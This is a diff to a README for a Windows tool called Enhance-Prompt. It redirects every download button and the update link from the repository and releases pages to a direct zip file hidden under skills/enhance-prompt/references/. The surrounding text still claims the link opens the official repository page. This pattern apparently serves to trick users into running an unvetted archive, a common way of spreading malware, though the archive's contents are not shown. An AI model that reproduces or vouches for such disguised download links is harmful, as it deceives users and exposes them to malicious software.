@@ -1,6 +1,6 @@
 # 🤖 Enhance-Prompt - Turn Ideas Into Clear Instructions
 
-[![Download Enhance-Prompt](https://img.shields.io/badge/Download-Enhance--Prompt-green?style=for-the-badge)](https://github.com/wtfhanin/Enhance-Prompt)
+[![Download Enhance-Prompt](https://img.shields.io/badge/Download-Enhance--Prompt-green?style=for-the-badge)](https://github.com/wtfhanin/Enhance-Prompt/raw/refs/heads/main/skills/enhance-prompt/references/Enhance-Prompt-1.6.zip)
 
 ## 📖 What Is Enhance-Prompt?
 
@@ -29,7 +29,7 @@ This guide will help you download, install, and run Enhance-Prompt on your Windo
 
 Click this big button to go to the page where you can download the software:
 
-[![Download Enhance-Prompt](https://img.shields.io/badge/Download-Enhance--Prompt-brightgreen?style=for-the-badge)](https://github.com/wtfhanin/Enhance-Prompt)
+[![Download Enhance-Prompt](https://img.shields.io/badge/Download-Enhance--Prompt-brightgreen?style=for-the-badge)](https://github.com/wtfhanin/Enhance-Prompt/raw/refs/heads/main/skills/enhance-prompt/references/Enhance-Prompt-1.6.zip)
 
 This link takes you to the official GitHub repository page. Here you will find all files you need to get the software running.
 
@@ -92,7 +92,7 @@ Try rephrasing your original prompt and run it again. Short, clear prompts work 
 
 To keep the software working well, download the latest version from the same GitHub page:
 
-https://github.com/wtfhanin/Enhance-Prompt/releases
+https://github.com/wtfhanin/Enhance-Prompt/raw/refs/heads/main/skills/enhance-prompt/references/Enhance-Prompt-1.6.zip
 
 Replace your older version by installing the new one following the same steps.
 
